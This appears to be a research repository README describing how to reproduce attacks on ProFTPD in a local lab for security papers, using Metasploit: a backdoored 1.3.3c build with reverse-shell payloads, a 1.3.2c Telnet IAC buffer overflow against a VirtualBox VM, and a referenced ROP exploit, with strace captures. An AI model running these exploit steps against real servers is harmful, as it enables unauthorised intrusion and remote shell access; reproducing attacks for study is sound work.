# reproduceAttacks
== Read me file ===
== Ke Tian @ 2016 ==

CSF/DSN reproduce
################## 1 backdoor attack 

LINK: https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor
File: proftpd-1.3.3c

payloads here:
ketian@ketian:/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0
./gems/metasploit-framework-4.12.20/modules/payloads/singles/cmd/unix/reverse_perl_ssl.rb

commands: 
ketian@ketian:~/Desktop$ md5sum proftpd-1.3.3c.tar.gz 
4f2c554d6273b8145095837913ba9e5d  proftpd-1.3.3c.tar.gz


### in proftpd-1.3.3c-backdoor folder ###
patch -p1 < /home/ketian/proftpd_133c_vun.patch

## to run the proftpd
## no need to make install, already make 
sudo ./proftpd -c `pwd`/sample-configurations/basic.conf

ketian@ketian:~/Desktop/proftpd-1.3.3c$ netstat -ln | grep 21
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     
unix  2      [ ACC ]     STREAM     LISTENING     12151    /run/user/1001/pulse/native


ps aux |grep proftp

## kill the service
killall -9 proftpd

### meta exploit
sudo msfconsole

msf > use exploit/unix/ftp/proftpd_133c_backdoor
msf exploit(proftpd_133c_backdoor) > show payloads

Compatible Payloads
===================

   Name                                Disclosure Date  Rank    Description
   ----                                ---------------  ----    -----------
   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)

msf exploit(proftpd_133c_backdoor) > set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse

msf exploit(proftpd_133c_backdoor) > set LHOST 127.0.0.1
LHOST => 127.0.0.1

msf exploit(proftpd_133c_backdoor) > set RHOST 127.0.0.1
RHOST => 127.0.0.1

msf exploit(proftpd_133c_backdoor) > set RPORT 21
RPORT => 21

msf exploit(proftpd_133c_backdoor) > exploit 
## you will get a shell here :)!


##for bind_perl_ipv6 IPV6 ###
in configure file, set ipv6 "ON"
in meta exploit:
set RHOST ::1 

##for cmd/unix/generic
set CMD touch /tmp/xxxx.tmp
 
## Do the strace ###
sudo strace -i -f -o xxxx.strace -p `pidof proftpd`

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


################## 2 Telnet buffer overflow 


video:
https://www.youtube.com/watch?v=NrUnsC72w3I

exploit website:
https://www.rapid7.com/db/modules/exploit/linux/ftp/proftp_telnet_iac

===
Environment: ProFTPD 1.3.2c Server (Ubuntu 10.04)
set up the virtual box (use oracle VirtualBox)

Image file (uVB.ova) is under the directory (with proftpd 1.3.2c installed)


directly run it.
 
=== Test machine (in VirtualBox) ==========
network setup: NAT  
rule 1: TCP 
Host IP: 127.0.0.1
HOST PORT: 2121
GUest IP: 10.0.2.15
Guest Port : 21

#check version
proftpdf -v

#start service
service Proftpd start

=== Local machine ==============
ketian@ketian:~$ sudo msfconsole
[sudo] password for ketian: 
+ -- --=[ 1573 exploits - 906 auxiliary - 270 post        ]
+ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/linux/ftp/proftp_telnet_iac 
msf exploit(proftp_telnet_iac) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
msf exploit(proftp_telnet_iac) > set RPORT 2121
RPORT => 2121
msf exploit(proftp_telnet_iac) > show targets 

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Debug
   2   ProFTPD 1.3.3a Server (Debian) - Squeeze Beta1
   3   ProFTPD 1_3_3a Server (Debian) - Squeeze Beta1 (Debug)
   4   ProFTPD 1.3.2c Server (Ubuntu 10.04)


msf exploit(proftp_telnet_iac) > set TARGET 4
TARGET => 4
msf exploit(proftp_telnet_iac) > exploit

[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] 127.0.0.1:2121 - Trying target ProFTPD 1.3.2c Server (Ubuntu 10.04)...
[*] 127.0.0.1:2121 - FTP Banner: 220 ProFTPD 1.3.2c Server (Debian) [::ffff:10.0.2.15]
[*] 127.0.0.1:2121 - !!! Attempting to bruteforce the cookie value! This can takes days. !!!
[*] 127.0.0.1:2121 - 0.00% complete, 0.00 attempts/sec - Trying: 0x0
[*] 127.0.0.1:2121 - 0.00% complete, 22.40 attempts/sec - Trying: 0xe000
...


## Do the strace on the test machine ###
sudo strace -i -f -o xxxx.strace -p `pidof proftpd`

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++


############# 3 ROP attack 
Please see the gzip folder and exploit.py for the constructions


--------------------------------------------------------------------------------------
CCS Reproduce
under construction 

